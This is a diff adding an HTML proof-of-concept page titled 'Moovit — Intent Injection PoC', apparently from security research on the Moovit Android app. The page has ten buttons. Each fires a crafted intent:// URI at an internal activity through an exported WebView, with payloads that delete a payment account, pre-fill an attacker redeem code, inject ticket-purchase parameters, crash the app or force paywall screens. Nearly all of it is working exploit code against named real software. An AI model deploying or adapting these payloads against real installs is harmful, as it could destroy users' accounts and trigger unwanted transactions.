@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+  body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; margin:0; }
+  h2 { color:#e94560; margin-bottom:4px; }
+  p { color:#aaa; font-size:12px; margin:0 0 16px; }
+  .section { margin-bottom:8px; }
+  .label { color:#888; font-size:11px; margin-bottom:2px; }
+  button {
+    display:block; width:100%; margin:4px 0; padding:12px 14px;
+    background:#16213e; color:#eee; border:1px solid #444;
+    font-family:monospace; font-size:13px; cursor:pointer; text-align:left;
+    border-radius:4px;
+  }
+  button:active { background:#e94560; }
+  .high   { border-left:4px solid #e94560; }
+  .medium { border-left:4px solid #f5a623; }
+  .low    { border-left:4px solid #4a90d9; }
+  #log { margin-top:16px; background:#0a0a0a; padding:12px; font-size:12px;
+         border:1px solid #333; border-radius:4px; word-break:break-all; }
+</style>
+</head>
+<body>
+<h2>&#x26A0; Moovit — Intent Injection PoC</h2>
+<p>Loaded via exported WebViewActivity. Each button fires an intent:// URI via shouldOverrideUrlLoading.</p>
+
+<div class="label">HIGH IMPACT</div>
+
+<button class="high" onclick="fire('delete_account')">
+  [1] PaymentAccountActionActivity — action=DELETE_ACCOUNT
+</button>
+
+<button class="high" onclick="fire('redeem')">
+  [2] MoovitPlusRedeemActivity — Pre-fill redeem code (code=ATTACKER_CODE_123)
+</button>
+
+<button class="high" onclick="fire('mot_welcome')">
+  [3] MotAccountCreationWelcomeActivity — Force MOT account creation flow
+</button>
+
+<div class="label" style="margin-top:10px">MEDIUM IMPACT</div>
+
+<button class="medium" onclick="fire('purchase_ticket')">
+  [4] PurchaseTicketActivity — Inject agencyId + ticketTypeId
+</button>
+
+<button class="medium" onclick="fire('tod_order')">
+  [5] TodOrderActivity — Open ride order screen
+</button>
+
+<button class="medium" onclick="fire('benefit')">
+  [6] BenefitRegistrationActivity — Crash / DoS app
+</button>
+
+<button class="medium" onclick="fire('moovit_plus')">
+  [7] MoovitPlusActivity — Force subscription upsell
+</button>
+
+<button class="medium" onclick="fire('paywall')">
+  [8] BlockPaywallActivity — Force paywall screen
+</button>
+
+<div class="label" style="margin-top:10px">LOW IMPACT</div>
+
+<button class="low" onclick="fire('settings')">
+  [9] SettingsActivity — Open app settings
+</button>
+
+<button class="low" onclick="fire('trip_plan')">
+  [10] TripPlanActivity — Open route planning screen
+</button>
+
+<pre id="log">Tap a button to fire intent...</pre>
+
+<script>
+var log = document.getElementById('log');
+var base = 'package=com.tranzmate;component=com.tranzmate/';
+
+var intents = {
+  delete_account:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.payment.account.actions.PaymentAccountActionActivity;' +
+    'S.action=DELETE_ACCOUNT;end',
+
+  redeem:
+    'intent://dummy?code=ATTACKER_CODE_123#Intent;' + base +
+    'com.moovit.app.plus.referral.MoovitPlusRedeemActivity;end',
+
+  mot_welcome:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.app.mot.welcome.MotAccountCreationWelcomeActivity;end',
+
+  purchase_ticket:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.ticketing.purchase.PurchaseTicketActivity;' +
+    'S.agencyId=1;S.ticketTypeId=1;end',
+
+  tod_order:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.app.tod.order.TodOrderActivity;end',
+
+  benefit:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.app.benefits.BenefitRegistrationActivity;end',
+
+  moovit_plus:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.app.plus.MoovitPlusActivity;end',
+
+  paywall:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.app.plus.paywall.BlockPaywallActivity;end',
+
+  settings:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.app.general.settings.SettingsActivity;end',
+
+  trip_plan:
+    'intent://dummy#Intent;' + base +
+    'com.moovit.feature.tripplan.TripPlanActivity;end'
+};
+
+function fire(key) {
+  log.innerText = '[>] ' + key + '\n' + intents[key];
+  window.location = intents[key];
+}
+</script>
+</body>
+</html>
